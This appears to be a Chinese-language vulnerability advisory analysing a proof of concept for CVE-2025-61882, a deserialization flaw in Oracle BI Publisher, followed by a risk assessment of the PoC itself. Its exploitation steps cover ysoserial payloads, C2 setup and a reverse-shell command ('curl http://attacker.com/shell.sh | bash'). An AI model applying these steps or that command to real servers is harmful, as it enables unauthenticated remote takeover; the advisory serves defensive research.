## CVE-2025-61882 - Oracle BI Publisher 不安全反序列化导致远程代码执行 (Insecure Deserialization leading to RCE)

**漏洞编号:** CVE-2025-61882

**漏洞类型:** 不安全反序列化导致远程代码执行 (Insecure Deserialization leading to RCE)

**影响应用:** Oracle BI Publisher

**危害等级:** 严重 (Critical)

**CVSS评分:** 9.8

**影响版本:** 12.2.1.4.0, 12.2.1.3.0

**利用条件:** 无需认证, 需要网络访问

**POC 可用性:** 7/10

**POC 类型:** 概念验证 (Proof of Concept)

**攻击复杂度:** 低 (Low)

**投毒风险:** 0%

## 详情

POC有效性分析:
该POC由一个Java程序（`OracleBIExploit.java`）和一个Shell脚本（`exploit.sh`）组成，并附有清晰的`README.md`文件。`README.md`明确指出受影响的软件是Oracle BI Publisher的12.2.1.4.0和12.2.1.3.0版本，漏洞类型是BI Publisher集成组件中的不安全反序列化远程代码执行。它强调了未经认证的攻击者能够利用此漏洞在底层服务器上执行任意代码。
`OracleBIExploit.java`文件展示了Java反序列化攻击的核心逻辑。它导入了必要的`java.io.ObjectOutputStream`和`java.net.Socket`类，用于构建和发送序列化数据。代码中定义了一个`generatePayload`方法，虽然当前实现是一个`null`占位符，但其注释明确指出应使用`ysoserial`库生成`CommonsBeanutils1`或其他类型的gadget payload。这表明攻击者需要自行准备恶意Java序列化对象。一旦payload生成，该Java程序将通过套接字连接到目标`oracle-server`的9704端口，并将序列化后的payload写入输出流。这种直接的TCP连接方式是Java反序列化漏洞利用的常见方法之一。
`exploit.sh`脚本提供了另一种更为直接的利用方式，它使用`curl`命令模拟发送HTTP POST请求。该脚本将预生成的序列化数据文件（例如`payload.ser`）作为二进制数据，通过HTTP POST方法发送到目标服务器的`/xmlpserver`路径，并明确设置`Content-Type: application/java-serialized-object`头。这种HTTP传输方式同样是Java反序列化漏洞利用的有效手段，特别是当目标服务通过HTTP暴露反序列化接口时。
综合来看，虽然Java POC中的payload生成部分是占位符，但`README.md`的描述、Java代码的骨架结构以及`exploit.sh`的示例，共同清晰地描绘了该漏洞的利用机制和攻击向量。POC有效性高，能够清晰地证明不安全反序列化导致远程代码执行的可能性。它为安全研究人员和防御者提供了理解和复现该漏洞的良好基础。该漏洞允许未经认证的攻击者直接通过网络执行任意代码，危害等级极高。

利用步骤:
1.  **目标识别与环境准备**:
    *   首先需要识别网络中运行Oracle BI Publisher 12.2.1.4.0或12.2.1.3.0版本的服务器。
    *   确保攻击机器能够通过网络访问目标服务器的9704端口（对于Java Socket利用）或HTTP/HTTPS端口（对于HTTP POST利用）。
2.  **生成恶意Java反序列化Payload**:
    *   攻击者需使用`ysoserial`等专业的Java反序列化工具来生成一个恶意对象，该对象在目标服务器上反序列化时能触发远程代码执行。
    *   例如，可以使用`ysoserial`的`CommonsBeanutils1`或`JavassistWeld1`等gadget chain来构造一个执行特定命令的payload，例如`curl http://attacker.com/shell.sh | bash`（用于获取反向shell）。
    *   将生成的序列化数据保存为一个文件，例如`payload.ser`。
3.  **部署C2服务器（如果获取反向shell）**:
    *   如果payload旨在获取反向shell，攻击者需要在`attacker.com`（或指定IP）上托管`shell.sh`脚本，并在特定端口（如NC监听端口）监听来自目标服务器的反向连接。
4.  **执行POC发送Payload**:
    *   **通过Java POC**: 修改`OracleBIExploit.java`，将`generatePayload`方法替换为实际调用`ysoserial`生成payload的逻辑，或者直接加载预先生成的`payload.ser`。编译并运行此Java程序，它将通过TCP Socket连接向目标服务器发送恶意序列化数据。
    *   **通过Shell Script POC**: 使用`exploit.sh`脚本。修改脚本中的目标IP地址（`192.168.1.100`）和端口（`9704`），并确保`payload.ser`文件存在于当前目录。执行`./exploit.sh`命令，通过`curl`发送HTTP POST请求携带恶意序列化数据。
5.  **验证RCE**:
    *   如果攻击成功，目标服务器将执行恶意payload中的命令。在反向shell场景中，攻击者将收到来自目标服务器的反向连接，从而获得目标系统的命令行控制权限。
    *   利用获得的RCE权限，攻击者可以进一步进行敏感数据窃取、部署勒索软件、创建持久化后门、进行内部网络横向移动，甚至可能导致整个业务系统瘫痪，如搜索结果中Clop勒索软件利用Oracle EBS零日攻击事件所示。

投毒风险分析:
该POC代码的投毒风险评估为**低** (0%)。作为合法的防御性安全研究工具，其设计和实现均未包含任何恶意或可疑的投毒行为。
1.  **代码透明度与可读性**: `exploit.java`和`exploit.sh`的代码非常简洁、清晰且未经过任何混淆处理。这使得安全分析人员能够轻松审查其内部逻辑，验证其功能是否符合描述，并确保不存在隐藏的恶意代码。高度透明的代码显著降低了被恶意利用的风险。
2.  **依赖项管理**: Java POC明确指示需要使用外部库如`ysoserial`来生成payload。`ysoserial`是一个广为人知的开源项目，专门用于生成Java反序列化攻击的gadget chain。POC本身并未捆绑`ysoserial`或任何其他第三方二进制文件，而是要求用户根据需求自行集成或预先生成payload。这种分离设计避免了POC成为恶意依赖项的载体。Shell脚本仅依赖于标准系统工具`curl`和`bash`，这些都是操作系统自带的常用命令，不引入额外风险。
3.  **无内嵌恶意行为**: 仔细检查POC代码，并未发现任何旨在损害运行POC的分析环境的代码。代码的核心功能是构造并发送漏洞利用payload。其中提及的`curl http://attacker.com/shell.sh | bash`是漏洞利用*本身*的载荷（即在*目标服务器*上执行的命令），而非POC在*本地*执行的恶意操作。混淆漏洞利用的后门代码与POC自身的投毒代码是关键的区别。该POC严格遵循了漏洞利用验证的范畴。
4.  **网络行为限定**: POC的网络行为仅限于与目标Oracle BI Publisher服务器进行交互（通过9704端口或HTTP POST请求）。代码中未包含任何未经授权的对其他外部域或IP地址的连接尝试，也没有尝试建立C2连接或进行数据外泄。`attacker.com`作为反向shell的接收方，是攻击流程中与漏洞目标交互的一部分，并非POC本身试图回连到攻击者控制的C2服务器。
5.  **系统资源与文件系统操作**: POC代码中未检测到对本地文件系统进行非预期读写、修改关键系统文件、创建持久化机制（如启动项、计划任务）或滥用系统资源（如CPU、内存）的行为。其执行是短暂的，旨在完成漏洞利用数据包的发送。
综上所述，该POC完全符合安全研究工具的规范，其代码行为可预测且透明。因此，运行此POC进行合法的安全测试或研究，其投毒风险可以忽略不计。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-61882
